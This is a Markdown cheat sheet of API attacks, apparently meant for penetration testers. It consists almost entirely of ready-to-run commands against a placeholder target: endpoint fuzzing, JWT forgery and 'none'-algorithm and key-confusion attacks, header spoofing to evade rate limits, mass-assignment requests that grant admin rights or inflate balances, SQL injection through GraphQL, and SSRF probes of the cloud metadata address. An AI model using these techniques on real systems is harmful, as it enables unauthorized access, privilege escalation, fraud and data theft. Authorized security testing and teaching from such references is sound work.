# API Attack Reference

## REST API Attacks

### Enumeration
```bash
# Discover endpoints
ffuf -u https://api.target.com/FUZZ -w api_endpoints.txt
arjun -u https://api.target.com/

# Check common paths
for path in /api/v1 /api/v2 /graphql /swagger /docs /admin; do
    curl -s -o /dev/null -w "%{http_code}" "https://api.target.com$path"
done
```

### Authentication Bypass
```bash
# Try without auth
curl https://api.target.com/admin/users

# JWT manipulation
# Decode
echo "eyJhbGciOi..." | base64 -d

# Modify payload
{"sub":"user123","role":"admin","iat":1234567890}

# Use modified token
curl -H "Authorization: Bearer <modified>" https://api.target.com/admin

# Check for weak signing
hashcat -m 16500 jwt.txt wordlist.txt
```

### Rate Limiting Bypass
```bash
# IP rotation
for i in {1..100}; do
    curl -H "X-Forwarded-For: 10.0.0.$i" https://api.target.com/login
done

# Header manipulation
curl -H "X-Real-IP: 1.2.3.4" https://api.target.com/login
curl -H "X-Originating-IP: 1.2.3.4" https://api.target.com/login
```

### Mass Assignment
```bash
# Add admin role
curl -X PUT https://api.target.com/users/me \
  -H "Authorization: Bearer <token>" \
  -d '{"name":"user","role":"admin"}'

# Add fields
curl -X PATCH https://api.target.com/users/me \
  -d '{"verified":true,"balance":999999}'
```

## GraphQL Attacks

### Introspection
```bash
# Full schema dump
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'

# Find queries
curl -X POST https://api.target.com/graphql \
  -d '{"query":"{__schema{queryType{fields{name}}}}"}'
```

### Injection
```bash
# SQL injection via GraphQL
{
  "query": "{
    user(id: \"1' OR '1'='1\") {
      name
      email
    }
  }"
}

# Batch query attack
{
  "query": "[user(id:1), user(id:2), ..., user(id:1000)]"
}
```

### Authorization Bypass
```bash
# Access other users' data
{
  "query": "{
    user(id: \"victim-id\") {
      name
      email
      passwordHash
    }
  }"
}
```

## OWASP API Security Top 10

### API1: Broken Object Level Authorization
```bash
# Access other users' resources
curl https://api.target.com/users/123/orders
curl https://api.target.com/users/456/orders  # Different user
```

### API2: Broken Authentication
```bash
# Weak password policy
# Try: password, 123456, admin, etc.

# Token leakage
# Check URL parameters
# Check browser history
# Check logs
```

### API3: Broken Object Property Level Authorization
```bash
# Mass assignment
curl -X PUT https://api.target.com/users/me \
  -d '{"name":"user","isAdmin":true}'
```

### API4: Unrestricted Resource Consumption
```bash
# Pagination bypass
curl "https://api.target.com/users?limit=999999"

# No rate limiting
for i in {1..1000}; do
    curl https://api.target.com/endpoint
done
```

### API5: Broken Function Level Authorization
```bash
# Access admin functions
curl https://api.target.com/api/admin/users
curl -X DELETE https://api.target.com/api/users/123
```

### API6: Unrestricted Access to Sensitive Business Flows
```bash
# Bypass purchase flow
curl -X POST https://api.target.com/order \
  -d '{"item":"premium","price":0}'
```

### API7: Server-Side Request Forgery
```bash
# Internal service discovery
curl "https://api.target.com/proxy?url=http://127.0.0.1:8080"
curl "https://api.target.com/proxy?url=http://169.254.169.254/"
```

### API8: Security Misconfiguration
```bash
# Check default configs
curl https://api.target.com/actuator
curl https://api.target.com/.env
curl https://api.target.com/config
```

### API9: Improper Inventory Management
```bash
# Find old API versions
curl https://api.target.com/v1/users
curl https://api.target.com/v2/users
curl https://api.target.com/beta/users
```

### API10: Unsafe Consumption of APIs
```bash
# SSRF via external API
curl -X POST https://api.target.com/webhook \
  -d '{"url":"http://169.254.169.254/"}'
```

## Token Attacks

### JWT None Algorithm
```bash
# Modify header
{"alg":"none","typ":"JWT"}

# Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>.
```

### JWT Key Confusion
```bash
# Use public key as HMAC secret
# Download public key
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | \
  openssl x509 -pubkey -noout > pub.pem

# Sign with public key
python3 -c "
import jwt
token = jwt.encode({'sub':'admin'}, open('pub.pem').read(), algorithm='HS256')
print(token)
"
```

### Session Token Prediction
```bash
# Analyze token patterns
# If timestamp-based, predict next token
# If sequential, increment
```
